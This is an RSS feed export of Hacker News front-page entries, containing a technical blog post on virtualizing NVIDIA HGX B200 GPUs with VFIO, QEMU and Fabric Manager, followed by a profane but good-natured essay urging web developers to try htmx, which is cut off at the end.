<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-12-18T20:38:59.815265+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46312792</id><title>Virtualizing Nvidia HGX B200 GPUs with Open Source</title><updated>2025-12-18T20:39:06.916692+00:00</updated><content>&lt;doc fingerprint="cd05d07f48a2a9cc"&gt;
  &lt;main&gt;
    &lt;p&gt;We recently enabled GPU VMs on NVIDIAâs B200 HGX machines. These are impressive machines, but they are also surprisingly trickier to virtualize than the H100s. So we sifted through NVIDIA manual pages, Linux forums, hypervisor docs and we made virtualization work. It wasnât like AWS or Azure was going to share how to do this, so we documented our findings.&lt;lb/&gt;This blog post might be interesting if youâd like to learn more about how NVIDIA GPUs are interconnected at the hardware level, the different virtualization models they support, or the software stack from the cards all the way up to the guest OS. If you have a few spare B200 HGX machines lying around, youâll be able to run GPU VMs on them by the end - all with open source.&lt;/p&gt;
    &lt;p&gt;HGX B200 Hardware Overview&lt;lb/&gt;âThree Virtualization Models&lt;lb/&gt;âPreparing the Host for Passthrough&lt;lb/&gt;âSwitching Drivers On-the-Fly&lt;lb/&gt;âPermanently Binding B200 GPUs to vfio-pci&lt;lb/&gt;âMatching Versions Between Host and VM&lt;lb/&gt;âHost Configuration&lt;lb/&gt;âBoot Image Requirements&lt;lb/&gt;âThe PCI Topology Trap&lt;lb/&gt;âThe Topology Mismatch&lt;lb/&gt;âSwitching to QEMU for Custom PCI Layouts&lt;lb/&gt;âThe Large-BAR Stall Problem&lt;lb/&gt;âSolution 1: Upgrade to QEMU 10.1+&lt;lb/&gt;âSolution 2: Disable BAR mmap (x-no-mmap=true)&lt;lb/&gt;âFabric Manager and Partition Management&lt;lb/&gt;âPredefined HGX B200 Partitions&lt;lb/&gt;âGPU IDs Are Not PCI Bus IDs&lt;lb/&gt;âInteracting with the Fabric Manager API&lt;lb/&gt;âProvisioning Flow&lt;lb/&gt;âClosing Thoughts: Open-Source GPU Virtualization on HGX B200&lt;/p&gt;
    &lt;p&gt;HGX is NVIDIAâs server-side reference platform for dense GPU compute. Instead of using PCIe cards connected through the hostâs PCIe bus, HGX systems use SXM modules - GPUs mounted directly to a shared baseboard. NVIDIAâs earlier generation GPUs like Hopper came in both SXM and PCIe versions, but the B200 ships only with the SXM version.&lt;lb/&gt;Also, even when H100 GPUs use SXMÂ modules, their HGX baseboard layouts look different than the B200s.&lt;/p&gt;
    &lt;p&gt;Within an HGX system, GPUs communicate through NVLink, which provides high-bandwidth GPU-to-GPU connectivity. NVSwitch modules merge these connections into a uniform all-to-all fabric, so every GPU can reach every other GPU with consistent bandwidth and latency. This creates a tightly integrated multi-GPU module rather than a collection of independent devices.&lt;lb/&gt;In short, the B200 HGX platformâs uniform, high-bandwidth architecture is excellent for performance - but less friendly to virtualization than discrete PCIe GPUs.&lt;/p&gt;
    &lt;p&gt;Because the B200âs GPUs operate as a tightly interconnected NVLink/NVSwitch fabric rather than as independent PCIe devices, only certain virtualization models are practical on HGX systems. A key component of this is NVIDIA Fabric Manager, the service responsible for bringing up the NVLink/NVSwitch fabric, programming routing tables, and enforcing isolation when GPUs are partitioned.&lt;/p&gt;
    &lt;p&gt;In Full Passthrough Mode, a VM receives direct access to the GPUs it is assigned. For multi-GPU configurations, the VM also takes ownership of the associated NVSwitch fabric, running both the NVIDIA driver and Fabric Manager inside the guest. On an HGX B200 system, this results in two configurations:&lt;/p&gt;
    &lt;p&gt;GPUs are grouped into partitions. A partition acts like an isolated NVSwitch island. Tenants can receive 1, 2, 4, or 8 GPUs. GPUs inside a partition retain full NVLink bandwidth, while GPUs in different partitions cannot exchange traffic. Fabric Manager manages routing and enforces isolation between partitions.&lt;/p&gt;
    &lt;p&gt;vGPU uses mediated device slicing to allow multiple VMs to share a single physical GPU. The GPUâs memory and compute resources are partitioned, and NVLink/NVSwitch are not exposed to the guest. This mode is optimized for light compute workloads rather than high-performance inference or training workloads.&lt;/p&gt;
    &lt;p&gt;Full Passthrough Mode is too limiting because it allows only âall 8 GPUsâ or â1 GPUâ assignments. Meanwhile, vGPU slicing is designed for fractional-GPU workloads and is not the best fit for high-performance ML use cases. Shared NVSwitch Multitenancy Mode provides the flexibility we need: it supports 1-, 2-, 4-, and 8-GPU VMs while preserving full GPU memory capacity and NVLink bandwidth within each VM.&lt;lb/&gt;With this context in place, the following sections describe how to run GPU VMs on the B200 using Shared NVSwitch Multitenancy Mode.&lt;/p&gt;
    &lt;p&gt;While the B200 GPUs are SXM modules, the Linux kernel still exposes them as PCIe devices. The procedure for preparing them for passthrough is similar: detach the GPUs from the hostâs NVIDIA driver and bind them to the vfio-pci driver so that a hypervisor can assign them to a VM.&lt;lb/&gt;You can inspect the B200 GPUs via PCI ID 10de:2901:&lt;/p&gt;
    &lt;code&gt;lspci -k -d 10de:2901
17:00.0 3D controller: NVIDIA Corporation Device 2901 (rev a1)
        DeviceName: #GPU0
        Kernel driver in use: nvidia
... &lt;/code&gt;
    &lt;p&gt;The 10de vendor ID identifies NVIDIA, and 2901 corresponds specifically to the B200. You can consult Supported NVIDIA GPU Products for a comprehensive list of NVIDIA GPUs and their corresponding device IDs.&lt;/p&gt;
    &lt;p&gt;During development, itâs common to switch between using the GPUs locally on the host and passing them through to a guest. The nvidia driver lets the host OS use the GPU normally, while vfio-pci isolates the GPU so a VM can control it. When a GPU is bound to vfio-pci, host tools like nvidia-smi wonât work. So switching drivers lets you alternate between host-side development and VM passthrough testing.&lt;lb/&gt;You can dynamically rebind the GPUs between the nvidia and vfio-pci drivers using their PCI bus addresses:&lt;/p&gt;
    &lt;code&gt;DEVS="0000:17:00.0 0000:3d:00.0 0000:60:00.0 0000:70:00.0 0000:98:00.0 0000:bb:00.0 0000:dd:00.0 0000:ed:00.0"

# bind to vfio-pci
for d in $DEVS; do
  echo "$d" &amp;gt; /sys/bus/pci/drivers/nvidia/unbind
  echo vfio-pci &amp;gt; /sys/bus/pci/devices/$d/driver_override
  echo "$d" &amp;gt; /sys/bus/pci/drivers_probe
  echo &amp;gt; /sys/bus/pci/devices/$d/driver_override
done

# bind back to nvidia
for d in $DEVS; do
  echo "$d" &amp;gt; /sys/bus/pci/drivers/vfio-pci/unbind
  echo nvidia &amp;gt; /sys/bus/pci/devices/$d/driver_override
  echo "$d" &amp;gt; /sys/bus/pci/drivers_probe
  echo &amp;gt; /sys/bus/pci/devices/$d/driver_override
done
&lt;/code&gt;
    &lt;p&gt;You can always verify the active driver by running: &lt;/p&gt;
    &lt;code&gt;lspci -k -d 10de:2901&lt;/code&gt;
    &lt;p&gt;For production passthrough scenarios, the GPUs should bind to vfio-pci automatically at boot. That requires configuring IOMMU support, preloading VFIO modules, and preventing the host NVIDIA driver from loading.&lt;/p&gt;
    &lt;p&gt;Enable the IOMMU in passthrough mode and instruct the kernel to bind 10de:2901 devices to vfio-pci:&lt;/p&gt;
    &lt;code&gt;# Edit /etc/default/grub to include:
GRUB_CMDLINE_LINUX_DEFAULT="... intel_iommu=on iommu=pt 
vfio-pci.ids=10de:2901"&lt;/code&gt;
    &lt;p&gt;Then apply the changes:&lt;/p&gt;
    &lt;code&gt;update-grub&lt;/code&gt;
    &lt;p&gt;To guarantee the VFIO driver claims the devices before any other driver can attempt to initialize them, we ensure the necessary kernel modules are loaded very early during the boot process.&lt;/p&gt;
    &lt;code&gt;tee /etc/modules-load.d/vfio.conf &amp;lt;&amp;lt;EOF
vfio
vfio_iommu_type1
vfio_pci
EOF&lt;/code&gt;
    &lt;p&gt;To prevent any potential driver conflicts, we stop the host kernel from loading the standard NVIDIA drivers by blacklisting them. This is essential for maintaining vfio-pci ownership for passthrough.&lt;/p&gt;
    &lt;code&gt;tee /etc/modprobe.d/blacklist-nvidia.conf &amp;lt;&amp;lt;EOF
blacklist nouveau
options nouveau modeset=0
blacklist nvidia
blacklist nvidia_drm
blacklist nvidiafb
EOF&lt;/code&gt;
    &lt;p&gt;Finally, apply all the module and driver configuration changes to the kernel's initial ramdisk environment and reboot the host system for the new configuration to take effect.&lt;/p&gt;
    &lt;code&gt;update-initramfs -u
reboot&lt;/code&gt;
    &lt;p&gt;After the reboot, verification is key. Running &lt;code&gt;lspci -k -d 10de:2901 &lt;/code&gt;should show all 8 GPUs are now correctly bound to the vfio-pci driver, confirming the host is ready for passthrough.All GPUs should show Kernel driver in use: vfio-pci.&lt;/p&gt;
    &lt;p&gt;Once the hostâs GPUs are configured for being passed through, the next critical requirement is ensuring that the NVIDIA driver stack on the host and inside each VM are aligned. Unlike full passthrough mode - where each VM initializes its own GPUs and NVSwitch fabric - Shared NVSwitch Multitenancy places Fabric Manager entirely on the host or a separate service vm. The host (or the service vm) is responsible for bringing up the NVSwitch topology, defining GPU partitions, and enforcing isolation between tenants.&lt;lb/&gt;Because of this architecture, the VMâs GPU driver must match the hostâs Fabric Manager version exactly. Even minor mismatches can result in CUDA initialization failures, missing NVLink connectivity, or cryptic runtime errors.&lt;lb/&gt;A second important requirement for the B200 HGX platform is that it only supports the NVIDIA "open" driver variant. The legacy proprietary stack cannot operate the B200. Both host and guest must therefore use the nvidia-open driver family.&lt;/p&gt;
    &lt;p&gt;On the host, after enabling the CUDA repository, install the components that bring up and manage the NVSwitch fabric:&lt;/p&gt;
    &lt;code&gt;apt install nvidia-fabricmanager nvlsm&lt;/code&gt;
    &lt;p&gt;You can verify the installed Fabric Manager version with:&lt;/p&gt;
    &lt;code&gt;dpkg -l nvidia-fabricmanager
NameÂ  Â  Â  Â  Â  Â  Version
===============-==================
nvidia-fabricmanager 580.95.05&lt;/code&gt;
    &lt;p&gt;Our VM images begin as standard Ubuntu cloud images. We customize them with virt-customize to install the matching nvidia-open driver:&lt;/p&gt;
    &lt;code&gt;dpkg -l nvidia-open
Name            Version
===============-==================
nvidia-open     580.95.05&lt;/code&gt;
    &lt;p&gt;To build our fully "batteries-included" AI-ready VM images, we also install and configure additional components such as the NVIDIA Container Toolkit, along with other runtime tooling commonly needed for training and inference workloads.&lt;lb/&gt;With driver versions aligned and the necessary tooling in place, each VM can access its assigned GPU partition with full NVLink bandwidth within the NVSwitch island, providing a seamless environment for high-performance ML workloads.&lt;/p&gt;
    &lt;p&gt;Our initial implementation used Cloud Hypervisor, which generally works well for CPU-only VMs and for passthrough of traditional PCIe GPUs. After binding the B200 GPUs to vfio-pci, we launched a VM like this:&lt;/p&gt;
    &lt;code&gt;cloud-hypervisor \
  ... # CPU/disk/network parameters omitted
  --device path=/sys/bus/pci/devices/0000:17:00.0/&lt;/code&gt;
    &lt;p&gt;Inside the VM, the driver loaded cleanly and nvidia-smi looked perfectly healthy:&lt;/p&gt;
    &lt;code&gt;nvidia-smi

+-----------------------------------------------------------------------------------------+
| NVIDIA-SMI 580.95.05              Driver Version: 580.95.05      CUDA Version: 13.0     |
...
|=========================================+========================+======================|
|   0  NVIDIA B200                    On  |   00000000:00:04.0 Off |                    0 |
+-----------------------------------------+------------------------+----------------------+&lt;/code&gt;
    &lt;p&gt;For a PCIe GPU, this would be the end of the story.&lt;lb/&gt;But on the B200, CUDA initialization consistently failed, even though nvidia-smi reported no issues:&lt;/p&gt;
    &lt;code&gt;python3 - &amp;lt;&amp;lt;'PY'
import ctypes
cuda = ctypes.CDLL('libcuda.so.1')
err = cuda.cuInit(0)
s = ctypes.c_char_p()
cuda.cuGetErrorString(err, ctypes.byref(s))
print("cuInit -&amp;gt;", err, (s.value.decode() if s.value else "&amp;lt;?&amp;gt;"))
PY

cuInit -&amp;gt; 3 initialization error&lt;/code&gt;
    &lt;p&gt;At this point, it was clear that if CUDA canât initialize, something fundamental in the virtualized hardware model is wrong. Other users had reported identical symptoms on HGX B200 systems. (e.g. https://forums.developer.nvidia.com/t/vfio-passthrough-for-hgx-b200-system/339906)&lt;/p&gt;
    &lt;p&gt;A critical difference emerged when comparing the PCI tree on the host to the PCI tree inside the VM. Inside the VM, the GPU sat directly under the PCI root complex:&lt;/p&gt;
    &lt;code&gt;lspci -tv -d 10de:2901 
-[0000:00]---04.0  NVIDIA Corporation Device 2901&lt;/code&gt;
    &lt;p&gt;But on the host, the B200 GPU sits several levels deep behind PCIe bridges and root ports:&lt;/p&gt;
    &lt;code&gt;lspci -tv -d 10de:2901
-[0000:00]-+-[0000:14]---02.0-[15-1a]----00.0-[16-1a]----00.0-[17]----00.0  NVIDIA Corporation Device 2901&lt;/code&gt;
    &lt;p&gt;The HGX architecture- and specifically CUDAâs initialization logic for B200-class GPUs - expects a multi-level PCIe hierarchy. Presenting a flat topology (GPU directly under the root complex) causes CUDA to abort early, even though the driver probes successfully.&lt;lb/&gt;Cloud Hypervisor does not currently provide a way to construct a deeper, host-like PCIe hierarchy. QEMU, however, does.&lt;/p&gt;
    &lt;p&gt;Launching the VM with QEMU using a plain VFIO device still produced the same flat topology:&lt;/p&gt;
    &lt;code&gt;qemu-system-x86_64 \
 ... # CPU/disk/network params omitted
-device vfio-pci,host=0000:17:00.0&lt;/code&gt;
    &lt;p&gt;But QEMU allows you to insert PCIe root ports and attach devices behind them, recreating a realistic hierarchy:&lt;/p&gt;
    &lt;code&gt;qemu-system-x86_64 \
  ... # CPU/disk/network params omitted
  -device pcie-root-port,id=rp1 \
  -device vfio-pci,host=0000:17:00.0,bus=rp1&lt;/code&gt;
    &lt;p&gt;Inside the VM, the topology now looked like this:&lt;/p&gt;
    &lt;code&gt;lspci -tv
-[0000:00]-+-04.0-[01]----00.0  NVIDIA Corporation Device 2901&lt;/code&gt;
    &lt;p&gt;This layout mirrors the hostâs structure: the GPU sits behind a root port, not directly under the root complex. With that change in place, CUDA initializes normally:&lt;/p&gt;
    &lt;code&gt;cuInit -&amp;gt; 0 no error&lt;/code&gt;
    &lt;p&gt;Now weâre in business!&lt;/p&gt;
    &lt;p&gt;With the PCI topology corrected, GPU passthrough worked reliably once the VM was up. However, a new issue emerged when passing through multiple B200 GPUs - especially 4 or 8 at a time. VM boot would stall for several minutes, and in extreme cases even over an hour before the guest firmware handed off to the operating system.&lt;lb/&gt;After investigating, we traced the issue to the enormous PCI Base Address Registers (BARs) on the B200. These BARs expose large portions of the GPUâs memory aperture to the host, and they must be mapped into the guestâs virtual address space during boot.&lt;lb/&gt;You can see the BAR sizes with:&lt;/p&gt;
    &lt;code&gt;lspci -vvv -s 17:00.0 | grep Region
Region 0: Memory at 228000000000 (64-bit, prefetchable) [size=64M]
Region 2: Memory at 220000000000 (64-bit, prefetchable) [size=256G]
Region 4: Memory at 228044000000 (64-bit, prefetchable) [size=32M]&lt;/code&gt;
    &lt;p&gt;The critical one is Region 2, a 256 GB BAR. QEMU, by default, mmaps the entire BAR into the guest, meaning:&lt;/p&gt;
    &lt;p&gt;Older QEMU versions (such as 8.2, which ships with Ubuntu 24.04) map these huge BARs extremely slowly, resulting in multi-minute or hour-long stalls during guest initialization.&lt;/p&gt;
    &lt;p&gt;QEMU 10.1 includes major optimizations for devices with extremely large BARs. With these improvements, guest boot times return to normal even when passing through all eight GPUs.&lt;/p&gt;
    &lt;p&gt;If upgrading QEMU or reserving large amounts of memory is not feasible, you can instruct QEMU not to mmap the large BARs directly, dramatically reducing the amount of virtual memory the guest must reserve:&lt;/p&gt;
    &lt;code&gt;qemu-system-x86_64 \
  ... # CPU/disk/network parameters omitted
  -device pcie-root-port,id=rp1 \
  -device vfio-pci,host=0000:17:00.0,bus=rp1,x-no-mmap=true&lt;/code&gt;
    &lt;p&gt;With x-no-mmap=true, QEMU avoids mapping the BARs into the guestâs virtual address space and instead uses a slower emulated access path. In practice:&lt;/p&gt;
    &lt;p&gt;Only workloads that directly access the BAR region at high rates may observe reduced performance.&lt;/p&gt;
    &lt;p&gt;With passthrough and PCI topology resolved, the final piece of Shared NVSwitch Multitenancy is partition management. In this mode, the hostâs Fabric Manager controls how the eight B200 GPUs are grouped into isolated NVSwitch âislandsâ, each of which can be assigned to a VM.&lt;lb/&gt;Fabric Manager operates according to a mode defined in:&lt;/p&gt;
    &lt;code&gt;/usr/share/nvidia/nvswitch/fabricmanager.cfg&lt;/code&gt;
    &lt;p&gt;The key setting is:&lt;/p&gt;
    &lt;code&gt;# Fabric Manager Operating Mode
# 0 - Bare-metal or full passthrough mode
# 1 - Shared NVSwitch multitenancy
# 2 - vGPU-based multitenancy
FABRIC_MODE=1&lt;/code&gt;
    &lt;p&gt;After updating the configuration:&lt;/p&gt;
    &lt;code&gt;systemctl restart nvidia-fabricmanager&lt;/code&gt;
    &lt;p&gt;With FABRIC_MODE=1, Fabric Manager starts in Shared NVSwitch Multitenancy Mode and exposes an API for activating and deactivating GPU partitions.&lt;/p&gt;
    &lt;p&gt;For an 8-GPU HGX system, NVIDIA defines a set of non-overlapping partitions that cover all common VM sizes (1, 2, 4, and 8 GPUs). Fabric Manager only allows one active partition per GPU; attempting to activate an overlapping partition will fail.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Partitions ID&lt;/cell&gt;
        &lt;cell role="head"&gt;Number of GPUs&lt;/cell&gt;
        &lt;cell role="head"&gt;GPU ID&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;1 to 8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;1 to 4&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;5 to 8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;1, 2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;5&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;3, 4&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;6&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;5, 6&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;7&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;7, 8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;9&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;10&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;3&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;11&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;4&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;12&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;5&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;13&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;6&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;14&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;7&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;15&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;These predefined layouts ensure that GPU groups always form valid NVSwitch âislandsâ with uniform bandwidth.&lt;/p&gt;
    &lt;p&gt;A critical detail: GPU IDs used by Fabric Manager do not correspond to PCI addresses, nor to the order that lspci lists devices. Instead, GPU IDs are derived from the âModule Idâ field reported by the driver.&lt;lb/&gt;You can find each GPUâs Module ID via:&lt;/p&gt;
    &lt;code&gt;nvidia-smi -q&lt;/code&gt;
    &lt;p&gt;Example:&lt;/p&gt;
    &lt;code&gt;GPU 00000000:17:00.0
  Product Name                  : NVIDIA B200
  ...
  Platform Info
      Peer Type                 : Switch Connected
      Module Id                 : 1&lt;/code&gt;
    &lt;p&gt;This Module ID (1â8) is the index used by partition definitions, activation commands, and NVSwitch routing logic. When passing devices to a VM, you must map Fabric Manager GPU Module IDs â PCI devices, not assume PCI order.&lt;/p&gt;
    &lt;p&gt;The GitHub repository Fabric-Manager-Client (https://github.com/NVIDIA/Fabric-Manager-Client) provides a simple commandâline utility fmpm (Fabric Manager Partition Manager) for interacting with the Fabric Manager API.&lt;lb/&gt;Usage examples:&lt;/p&gt;
    &lt;code&gt;fmpm -l
# lists all partitions, their sizes, status (active/inactive)

fmpm -a 3
# activate partition ID 3

fmpm -d 3
# deactivate partition ID 3&lt;/code&gt;
    &lt;p&gt;Putting everything together, the high-level flow for provisioning a GPU-enabled VM looks like this:&lt;/p&gt;
    &lt;p&gt;This workflow gives each tenant access to high-performance GPU clusters with full bandwidth and proper isolation, making the B200 HGX platform viable for multi-tenant AI workloads.&lt;/p&gt;
    &lt;p&gt;Getting NVIDIAâs HGX B200 platform to behave naturally in a virtualized, multi-tenant environment requires careful alignment of many layers: PCI topology, VFIO configuration, driver versioning, NVSwitch partitioning, and hypervisor behavior. When these pieces fit together, the result is a flexible, high-performance setup where tenants receive full-bandwidth NVLink inside their VM while remaining fully isolated from other workloads.&lt;lb/&gt;A final note we care about: everything described in this post is implemented in the open. Ubicloud is a fully open-source cloud platform, and the components that manage GPU allocation, activate NVSwitch partitions, configure passthrough, and launch VMs are all public and available for anyone to inspect, adapt, or contribute to.&lt;lb/&gt;If youâd like to explore how this works behind the scenes, here are good entry points:&lt;/p&gt;
    &lt;p&gt;We hope this helps others working with HGX platforms or building GPU-backed infrastructure. If you have any questions for us, please drop us a line at [email protected]&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.ubicloud.com/blog/virtualizing-nvidia-hgx-b200-gpus-with-open-source"/><published>2025-12-18T14:04:03+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46312973</id><title>Please Just Try Htmx</title><updated>2025-12-18T20:39:06.768817+00:00</updated><content>&lt;doc fingerprint="2d3a910c51e20a7c"&gt;
  &lt;main&gt;&lt;p&gt;A measured-yet-opinionated plea from someone who's tired of watching you suffer&lt;/p&gt;&lt;p&gt;Look. I'm not going to call you a fucking moron every other sentence. That's been done. It's a whole genre now. And honestly? HTMX doesn't need me to scream at you to make its point.&lt;/p&gt;&lt;p&gt;The sweary web manifesto thing is fun—I've enjoyed reading them—but let's be real: yelling "JUST USE HTML" or "JUST FUCKING USE REACT" hasn't actually changed anyone's stack. People nod, chuckle, and then go right back to fighting their raw JS or their webpack config.1&lt;/p&gt;&lt;p&gt;So I'm going to try something different. I'll still swear (I'm not a fucking saint), but I'm also going to show you something, in the course of imploring you, for your own sanity and happiness, to at least please just try htmx.&lt;/p&gt;&lt;p&gt;Right now, the shouters are offering you two options:&lt;/p&gt;&lt;p&gt;Option A: "Just use HTML!" And they're not wrong. HTML is shockingly capable. Forms work. Links work. The &lt;code&gt;&amp;lt;dialog&amp;gt;&lt;/code&gt; element exists now. The web was built on this stuff and it's been chugging along since Tim Berners-Lee had hair. And a little tasteful CSS can go a long motherfucking way.&lt;/p&gt;&lt;p&gt;But sometimes—and here's where it gets uncomfortable—you actually do need a button that updates part of a page without reloading the whole damn thing. You do need a search box that shows results as you type. You do need interactivity.&lt;/p&gt;&lt;p&gt;So you turn to:&lt;/p&gt;&lt;p&gt;Option B: React (or Vue, or Svelte, or Angular if you're being punished for something).&lt;/p&gt;&lt;p&gt;And suddenly you've got:&lt;/p&gt;&lt;code&gt;package.json&lt;/code&gt; with 847 dependencies&lt;code&gt;useEffect&lt;/code&gt; runs twice&lt;p&gt;For what? A to-do list? A contact form? A dashboard that displays some numbers from a database?&lt;/p&gt;&lt;p&gt;This is the false choice: raw HTML's limitations or JavaScript framework purgatory.&lt;/p&gt;&lt;p&gt;There's a third option. I'm begging you, please just try it.&lt;/p&gt;&lt;p&gt;What if I told you:&lt;/p&gt;&lt;p&gt;That's HTMX. That's literally the whole thing.&lt;/p&gt;&lt;p&gt;Here's a button that makes a POST request and replaces itself with the response:&lt;/p&gt;&lt;code&gt;&amp;lt;button hx-post="/clicked" hx-swap="outerHTML"&amp;gt;
    Click me
&amp;lt;/button&amp;gt;&lt;/code&gt;

&lt;p&gt;When you click it, HTMX POSTs to &lt;code&gt;/clicked&lt;/code&gt;, and whatever HTML the server returns replaces the button. No &lt;code&gt;fetch()&lt;/code&gt;. No &lt;code&gt;setState()&lt;/code&gt;. No &lt;code&gt;npm install&lt;/code&gt;. No fucking webpack config.&lt;/p&gt;&lt;p&gt;The server just returns HTML. Like it's 2004, except your users have fast internet and your server can actually handle it. It's the hypermedia architecture the entire freaking web was designed for, but with modern conveniences.&lt;/p&gt;&lt;p&gt;This page uses HTMX. These demos actually work.&lt;/p&gt;&lt;p&gt;This button makes a POST request and swaps in the response:&lt;/p&gt;&lt;p&gt;This button fetches additional content and appends it below:&lt;/p&gt;&lt;p&gt;Here's some initial content.&lt;/p&gt;&lt;p&gt;Type something—results update as you type (debounced, of course):&lt;/p&gt;&lt;p&gt;That's HTMX. I didn't write JavaScript to make those work. I wrote HTML attributes. The "server" (mocked client-side for this demo, but the htmx code is real) returns HTML fragments, and HTMX swaps them in. The behavior is right there in the markup—you don't have to hunt through component files and state management code to understand what a button does. HTMX folks call this "Locality of Behavior" and once you have it, you'll miss it everywhere else.&lt;/p&gt;&lt;p&gt;Anecdotes are nice. Data is better.&lt;/p&gt;&lt;p&gt;A company called Contexte rebuilt their production SaaS app from React to Django templates with HTMX. Here's what happened:&lt;/p&gt;&lt;p&gt;They deleted two-thirds of their codebase and the app got better. Every developer became "full-stack" because there wasn't a separate frontend to specialize in anymore.&lt;/p&gt;&lt;p&gt;Now, they note this was a content-focused app and not every project will see these exact numbers. Fair. But even if you got half these improvements, wouldn't that be worth a weekend of experimentation?&lt;/p&gt;&lt;p&gt;"But what about complex client-side state management?"&lt;/p&gt;&lt;p&gt;You probably don't have complex client-side state. You have forms. You have lists. You have things that show up when you click other things. HTMX handles all of that.&lt;/p&gt;&lt;p&gt;If you're building Google Docs, sure, you need complex state management. But you're not building Google Docs. You're building a CRUD app that's convinced it's Google Docs.&lt;/p&gt;&lt;p&gt;"But the React ecosystem!"&lt;/p&gt;&lt;p&gt;The ecosystem is why your &lt;code&gt;node_modules&lt;/code&gt; folder is 2GB. The ecosystem is why there are 14 ways to style a component and they all have tradeoffs. The ecosystem is why "which state management library" is somehow still a debate.&lt;/p&gt;&lt;p&gt;HTMX's ecosystem is: your server-side language of choice. That's it. That's the ecosystem.&lt;/p&gt;&lt;p&gt;"But SPAs feel faster!"&lt;/p&gt;&lt;p&gt;After the user downloads 2MB of JavaScript, waits for it to parse, waits for it to execute, waits for it to hydrate, waits for it to fetch data, waits for it to render... yes, then subsequent navigations feel snappy. Congratulations.&lt;/p&gt;&lt;p&gt;HTMX pages load fast the first time because you're not bootstrapping an application runtime. And subsequent requests are fast because you're only swapping the parts that changed.&lt;/p&gt;&lt;p&gt;"But I need [specific React feature]!"&lt;/p&gt;&lt;p&gt;Maybe you do. I'm not saying React is never the answer. I'm saying it's the answer to about 10% of the problems it's used for, and the costs of reaching for it reflexively are staggering.&lt;/p&gt;&lt;p&gt;Most teams don't fail because they picked the wrong framework. They fail because they picked too much framework. HTMX is a bet on simplicity, and simplicity tends to win over time.&lt;/p&gt;&lt;p&gt;I'm not a zealot. HTMX isn't for everything.&lt;/p&gt;&lt;p&gt;But be honest with yourself: is that what you're building?&lt;/p&gt;&lt;p&gt;Or are you building another dashboard, another admin panel, another e-commerce site, another blog, another SaaS app that's fundamentally just forms and tables and lists? Be honest. I won't tell anyone. We all have to pay the bills.&lt;/p&gt;&lt;p&gt;For that stuff, HTMX is embarrassingly good. Like, "why did we make it so complicated" good. Like, "oh god, we wasted so much time" good.&lt;/p&gt;&lt;p&gt;You've tried React. You've tried Vue. You've tried Angular and regretted it. You've tried whatever meta-framework is trending on Hacker News this week.&lt;/p&gt;&lt;p&gt;Just try HTMX. One weekend. Pick a side project. Pick that internal tool nobody cares about. Pick the thing you've been meaning to rebuild anyway.&lt;/p&gt;&lt;p&gt;Add one &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag. Write one &lt;code&gt;hx-get&lt;/code&gt; attribute. Watch what happens.&lt;/p&gt;&lt;p&gt;If you hate it, you've lost a weekend. But you won't hate it. You'll wonder why you ever thought web development had to be so fucking complicated.&lt;/p&gt;&lt;p&gt; Learn more:&lt;lb/&gt; htmx.org — The official site and docs&lt;lb/&gt; hypermedia.systems — The 